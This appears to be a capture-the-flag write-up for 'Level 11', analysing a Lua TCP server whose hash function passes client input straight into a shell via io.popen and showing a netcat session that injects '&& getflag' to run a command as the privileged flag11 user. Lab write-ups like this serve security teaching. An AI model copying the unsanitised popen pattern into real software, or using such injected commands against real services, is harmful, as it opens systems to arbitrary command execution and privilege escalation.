# Level 11: Command Injection via Lua Script

## Program Analysis: `level11.lua`

The provided Lua script (`level11.lua`) sets up a simple TCP server listening on `127.0.0.1:5151`.

**Functionality:**

1.  **Listens for Connections:** It waits for clients to connect to port 5151 using `socket.bind` and `server:accept()`.
    ```lua
    local server = assert(socket.bind("127.0.0.1", 5151))
    -- ... later in the loop ...
    local client = server:accept()
    ```
2.  **Prompts for Password:** Upon connection, it sends a "Password: " prompt to the client.
    ```lua
    client:send("Password: ")
    ```
3.  **Receives Input:** It reads the line of text sent by the client.
    ```lua
    local l, err = client:receive()
    ```
4.  **Hashes Input:** It defines a `hash` function that takes the client's input (`pass`) and constructs/executes a shell command using `io.popen` to get the SHA-1 hash.
    ```lua
    function hash(pass)
      prog = io.popen("echo "..pass.." | sha1sum", "r")
      data = prog:read("*all")
      prog:close()
      data = string.sub(data, 1, 40)
      return data
    end
    -- ... later called with ...
    local h = hash(l)
    ```
5.  **Compares Hash:** It compares the calculated SHA-1 hash (`h`) with a hardcoded target hash.
    ```lua
    if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
        -- Handle mismatch
    else
        -- Handle match
    end
    ```
6.  **Sends Result:** It sends "Gz you dumb*\n" if the hashes match, or "Erf nope..\n" otherwise.
    ```lua
    client:send("Erf nope..\n");
    -- or
    client:send("Gz you dumb*\n")
    ```
7.  **Closes Connection:** It closes the client connection.
    ```lua
    client:close()
    ```

The script runs with SUID/SGID permissions for `flag11`, meaning any commands executed via `io.popen` will run as user `flag11`.

## Vulnerability: Command Injection

The path hijacking of level03 would not work here because the server is already running with its own environment when we start the level.
In this case, the critical vulnerability lies within the `hash` function, specifically in the line:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

The script directly concatenates the user-provided input (`pass`) into the shell command string without any sanitization or escaping. This allows a malicious client to inject shell metacharacters (like `;`, `&&`, `||`, `$(...)`, `` `...` ``) to execute arbitrary commands on the server with the privileges of the `flag11` user.

## Exploitation

To exploit this, we need to connect to the server and send a payload that includes a command separator followed by the `getflag` command. Since the server reads the output of the *entire* piped command (`echo ... | sha1sum`), simply running `getflag` might not display the flag directly to our client connection, as the Lua script captures it.

A reliable method is to redirect the output of `getflag` to a file we can read later.

1.  **Connect to the server:**
    ```bash
    nc 127.0.0.1 5151
    ```
2.  **Send the payload:** When prompted for the password, send a string containing the command injection. Using `&&` ensures `getflag` only runs if `echo` succeeds (which it always will). We redirect `getflag`'s output to a temporary file (e.g., `/tmp/flag11_output`):
    ```
    whatever && getflag > /tmp/flag11_output
    ```
    *(Note: The specific text before `&&`, like "whatever", doesn't matter for the injection itself)*
3.  **Receive Server Response:** The server will likely respond with "Erf nope..\n" because the hash comparison will fail (the output of `getflag` is not the expected hash).
4.  **Read the Flag:** After the connection closes, read the content of the output file:
    ```bash
    cat /tmp/flag11_output
    ```
    This will display the flag needed to log in as `flag11` (e.g., `Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s`).
